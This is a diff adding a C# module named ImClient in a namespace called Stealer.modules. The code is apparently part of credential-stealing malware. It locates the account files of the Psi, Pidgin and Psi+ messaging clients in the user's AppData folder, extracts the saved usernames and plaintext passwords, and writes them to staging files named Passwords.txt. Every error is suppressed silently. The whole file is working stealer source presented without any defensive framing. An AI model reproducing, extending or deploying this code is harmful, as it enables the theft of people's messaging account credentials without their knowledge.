@@ -1,0 +1,113 @@
+﻿using System;
+using System.IO;
+using System.Xml;
+
+namespace Stealer.modules
+{
+  internal class ImClient
+  {
+    public static void GetImClients()
+    {
+      ImClient.GetPsi();
+      ImClient.GetPidgin();
+      ImClient.GetPsiPlus();
+    }
+
+    private static void GetPsi()
+    {
+      string path = Program.path + "\\IM";
+      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Psi\\profiles\\default\\accounts.xml";
+      if (!File.Exists(str))
+        return;
+      XmlDocument xmlDocument = new XmlDocument();
+      xmlDocument.Load(str);
+      foreach (XmlElement xmlElement in ((XmlElement) xmlDocument.GetElementsByTagName("accounts")[0]).GetElementsByTagName("a0"))
+      {
+        try
+        {
+          string innerText = xmlElement.GetElementsByTagName("jid")[0].InnerText;
+          if (xmlElement.GetElementsByTagName("password")[0].InnerText != null)
+          {
+            if (!Directory.Exists(path))
+            {
+              Directory.CreateDirectory(path);
+              Directory.CreateDirectory(path + "\\Psi");
+            }
+            else
+              Directory.CreateDirectory(path + "\\Psi");
+            using (StreamWriter streamWriter = new StreamWriter(path + "\\Psi\\Passwords.txt", true))
+              streamWriter.WriteLine("\n[PASSWORDS]\nProtocol: " + xmlElement.GetElementsByTagName("resource")[0].InnerText + "\nUser: " + innerText + "\nPassword: " + xmlElement.GetElementsByTagName("password")[0].InnerText);
+          }
+        }
+        catch
+        {
+        }
+      }
+    }
+
+    private static void GetPidgin()
+    {
+      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.purple\\accounts.xml";
+      string path = Program.path + "\\IM";
+      if (!File.Exists(str))
+        return;
+      XmlDocument xmlDocument = new XmlDocument();
+      xmlDocument.Load(str);
+      foreach (XmlElement xmlElement in xmlDocument.GetElementsByTagName("account")[0])
+      {
+        try
+        {
+          if (xmlElement.GetElementsByTagName("password")[0].InnerText != null)
+          {
+            if (!Directory.Exists(path))
+            {
+              Directory.CreateDirectory(path);
+              Directory.CreateDirectory(path + "\\Pidgin");
+            }
+            else
+              Directory.CreateDirectory(path + "\\Pidgin");
+            using (StreamWriter streamWriter = new StreamWriter(path + "\\Pidgin\\Passwords.txt", true))
+              streamWriter.WriteLine("\n[PASSWORDS]\nProtocol: " + xmlElement.GetElementsByTagName("protocol")[0].InnerText + "\nUser: " + xmlElement.GetElementsByTagName("name")[0].InnerText + "\nPassword: " + xmlElement.GetElementsByTagName("password")[0].InnerText);
+          }
+        }
+        catch
+        {
+        }
+      }
+    }
+
+    private static void GetPsiPlus()
+    {
+      string path = Program.path + "\\IM";
+      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Psi+\\profiles\\default\\accounts.xml";
+      if (!File.Exists(str))
+        return;
+      XmlDocument xmlDocument = new XmlDocument();
+      xmlDocument.Load(str);
+      foreach (XmlElement xmlElement in ((XmlElement) xmlDocument.GetElementsByTagName("accounts")[0]).GetElementsByTagName("a0"))
+      {
+        try
+        {
+          string innerText = xmlElement.GetElementsByTagName("jid")[0].InnerText;
+          if (xmlElement.GetElementsByTagName("password")[0].InnerText != null)
+          {
+            if (!Directory.Exists(path))
+            {
+              Directory.CreateDirectory(path);
+              Directory.CreateDirectory(path + "\\Psi+");
+            }
+            else
+              Directory.CreateDirectory(path + "\\Psi+");
+            Console.WriteLine(xmlElement.GetElementsByTagName("password")[0].InnerText);
+            Console.Read();
+            using (StreamWriter streamWriter = new StreamWriter(path + "\\Psi+\\Passwords.txt", true))
+              streamWriter.WriteLine("\n[PASSWORDS]\nProtocol: " + xmlElement.GetElementsByTagName("resource")[0].InnerText + "\nUser: " + innerText + "\nPassword: " + xmlElement.GetElementsByTagName("password")[0].InnerText);
+          }
+        }
+        catch
+        {
+        }
+      }
+    }
+  }
+}
